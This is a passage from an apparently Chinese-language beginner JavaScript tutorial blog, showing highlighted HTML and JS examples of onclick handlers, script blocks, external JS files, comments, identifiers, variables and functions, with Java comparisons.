class="comment">onclick事件句柄当中的JS代码会被执行！onclick后面代码实际上是浏览器负责执行的。</span></span><br><span class="line"><span class="comment">4、onclick=&quot;后面的代码&quot;并不是在浏览器打开的时候执行，浏览器打开的时候，只是将这个代码</span></span><br><span class="line"><span class="comment">注册给onclick事件句柄了。等待该按钮的click事件发生，只要发生，后面代码会被事件监听器</span></span><br><span class="line"><span class="comment">调用。</span></span><br><span class="line"><span class="comment">5、怎么使用JS代码弹窗？</span></span><br><span class="line"><span class="comment">在JS当中有一个内置的BOM对象，可以直接拿来使用，全部小写：window</span></span><br><span class="line"><span class="comment">其中window对象有一个方法/函数叫做alert，这个函数专门用来弹出对话框！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6、window.alert(&#x27;hello world!&#x27;); 弹窗的JS代码。</span></span><br><span class="line"><span class="comment">通过这个代码可以知道：JS中的字符串可以使用单引号括起来，也可以使用双引号。</span></span><br><span class="line"><span class="comment">JS中的一条语句可以“;”结尾，也可以不以“;”结尾。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;window.alert(&#x27;hello world!&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello2&quot;</span> <span class="attr">onclick</span>=<span class="string">&#x27;window.alert(&quot;hello world!&quot;)</span></span></span><br><span class="line"><span class="string"><span class="tag"> window.alert(&quot;hello kitty&quot;)</span></span></span><br><span class="line"><span class="string"><span class="tag"> window.alert(&quot;你好,中国!&quot;)&#x27;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- window. 可以省略 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello3&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;hello world!&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"><a href="#出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。" class="headerlink" title="出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"></a>出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。</h3><h2 id="3-2-脚本块方式"><a href="#3-2-脚本块方式" class="headerlink" title="3.2 脚本块方式"></a>3.2 脚本块方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 脚本块的位置随意，没有限制！ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;page begin&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS代码的第二种方式：脚本块的方式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 这个按钮会先被加载到浏览器内存。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 脚本块 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 一个页面中脚本块可以出现多个！ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 在这里直接编写JS代码，这些JS代码在页面打开的时候自上而下的顺序依次逐行执行！ */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(&quot;hello world&quot;); // 单行注释</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello zhangsan&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello lisi&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">多行注释</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 最后加载这个按钮2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮2&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;page end!&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-3-引入外部独立的JS文件"><a href="#3-3-引入外部独立的JS文件" class="headerlink" title="3.3 引入外部独立的JS文件"></a>3.3 引入外部独立的JS文件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>在HTML中嵌入JS的第三种方式：引入外部独立的JS文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入外部独立的CSS文件。这个标签link中属性是href --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入外部独立的js文件 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- script标签引入js文件的时候，是src属性，不是href。 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 引入第二次，这个操作没有意义，测试结果：只要引入一次JS文件，JS文件中的代码就会全部执行一遍 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/1.js&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(&quot;hello world!~~~~~&quot;); // 这里的代码不会执行！</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 单独的脚本块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello world!%%%%%%%%&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件代码"><a href="#文件代码" class="headerlink" title="文件代码"></a>文件代码</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这是一堆JS代码，这些JS代码在HTML引入的时候，遵循自上而下的顺序依次逐行执行的！ */</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;hello kitty&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="关于各种注释"><a href="#关于各种注释" class="headerlink" title="关于各种注释"></a>关于各种注释</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>关于各种注释<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* CSS的注释 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这是HTML的注释 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 这是javascript注释，多行 */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 这是javascript注释,单行</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>标识符和关键字<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/* 标识符命名规则和命名规范按照java那一套来就行！ */</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">以下这段代码是JS的for循环，找出其中的关键字和标识符？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关键字：var、for</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符：i、alert</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符命名规则：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符只能由数字、字母、下划线、美元符号组成，不能含有其它特殊符号</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符不能以数字开始</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符严格区分大小写</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关键字不能做标识符</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符理论上没有长度限制</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">标识符命名规范？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">.....</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;i = &quot;</span> + i)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JS的变量<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">回顾Java中的变量？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么声明？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">double d;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">String s;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么赋值？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">d = 3.14;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">s = &quot;abc&quot;;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">一行上能声明多个变量吗？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int a, b, c = 300;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">a b c都是int类型。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">a和b没有赋值。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">c赋值300</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">重点：Java语言是一种强类型语言，有编译阶段，属于编译型语言。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">Java语言在编译阶段确定变量的数据类型，也就是说程序还没有</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">运行呢，变量的数据类型就已经确定了，并且该变量的数据类型</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">在这一生中，永远不可变。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">int x = 1200;【x = true; java的编译器会报错。不让这样做。语法不对！】</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">double d = x; </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">这行代码表示x的变量中保存的值1200给d变量</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">x变量还是int类型，d变量是double类型。一生不变。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JS的变量？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么声明？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var 变量名;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">怎么赋值？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">变量名 = 值;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">一行上能声明多个变量吗？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var a, b, c = 300;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">声明3个变量，a b c，并且c赋值300，其中a和b变量没有赋值，系统默认赋值undefined</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">undefined 在JS中一个具体的值，这个值就是 undefined</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">重点：JS语言是一种弱类型语言，没有编译阶段，直接浏览器打开解释执行，</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">在JS中声明变量时不需要指定变量的数据类型，程序在运行过程当中，赋什么</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">类型的值，变量就是什么数据类型，并且变量的数据类型是可变的。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">var i;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 100; 到这里i是整数型</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = false; 到这里i就是布尔类型了</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = true;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = 3.14;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">i = new Object();</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> i;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(i) <span class="comment">// 变量只声明没有赋值,系统默认赋值undefined, 在JS当中undefined是一个具体存在的值.</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> x = <span class="string">&quot;undefined&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(x) <span class="comment">// &quot;undefined&quot;这个不是undefined,它是一个字符串.</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 声明时,同时赋值</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> k = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k + <span class="number">1</span>) <span class="comment">// 101</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   k = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   k = <span class="string">&quot;abc&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(k)</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 一行上可以声明多个变量</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//var是一个关键字,就是用来声明变量的,variables单词的前3个字母.</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> a, b, c = <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(a) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(b) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(c) <span class="comment">// 100</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>函数初步<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//alert(122222);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">回顾Java中的方法：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">[修饰符列表] 返回值类型 方法名(形式参数列表)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">方法体;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">例如：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">public static int sum(int a,int b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">return a + b;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JavaScript当中的函数：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数定义的语法格式是什么？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">function 函数名(形式参数列表)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数体;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">例如：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">function sum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">return a + b;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">&#125;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">函数名：sum</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">形式参数列表是：a和b  (a和b都是变量名！)</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">JS中的函数返回值类型是不需要指定的，因为可以返回任何类型的数据。没有限制。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">关于JS的的调试？</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">首选方案是：alert()，在程序的某个位置先使用alert弹出某个变量的值，看看是否是你需要的。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">通过alert可以调试JS代码。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">另外一种方案是：采用浏览器自带的调试插件，F12</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">F12这个插件中比较重要的面板：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">控制台</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">查看器</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">网络</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">掌握以上三个面板！！！！！！！！！！！！</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* function sum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   &#125; */</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 函数必须调用才会执行.</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x, y</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(x + <span class="string">&quot;,&quot;</span> + y);</span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//alert(&quot;sum函数执行了！&quot;);</span></span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//这一切都是因为js是一门弱类型语言!</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="string">&quot;abc&quot;</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>();</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用sum函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* JS的函数还有另一种声明方式？*/</span></span></span><br><span class="line"><span class="language-javascript">   <span class="comment">/* function mysum(a, b)&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   </span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">   &#125; */</span></span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//效果相同</span></span></span><br><span class="line"><span class="language-javascript">   mysum = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">return</span> a 